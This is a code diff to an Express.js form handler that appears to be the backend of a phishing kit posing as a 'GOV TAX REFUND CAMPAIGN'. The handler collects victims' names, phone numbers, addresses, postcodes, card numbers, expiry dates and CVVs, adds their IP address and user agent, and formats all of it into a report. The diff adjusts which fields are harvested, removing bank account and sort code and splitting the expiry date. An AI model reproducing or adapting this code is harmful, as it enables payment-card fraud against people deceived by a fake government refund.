@@ -20,7 +20,7 @@ const formLimiter = rateLimit({
   });
 
 app.post("/submit-form", formLimiter, async (req, res) => {
-    const { firstName, lastName, phoneNum, address, city, postcode, cardNum, expiry, cvv, accountNum, sortCode } = req.body;
+    const { firstName, phoneNum, address, postcode, cardNum, expiryMonth, expiryYear, cvv } = req.body;
   
     const userAgent = req.headers['user-agent'];
 
@@ -46,15 +46,12 @@ if (req.body.phone_number) {
   GOV TAX REFUND CAMPAIGN:
 
   First Name: ${firstName}
-  Last Name: ${lastName}
   Phone num: ${phoneNum}
-  Address: ${address}
-  City ${city}
+  House Number: ${address}
   Post code: ${postcode}
   Card Number: ${cardNum}
-  expiry: ${expiry}
-  Acc No: ${accountNum}
-  Sort code: ${sortCode}
+  expiry Month: ${expiryMonth}
+  Expiry Year: ${expiryYear}
   cvv: ${cvv}
   IP: ${ip}
   User Agent: ${userAgent}
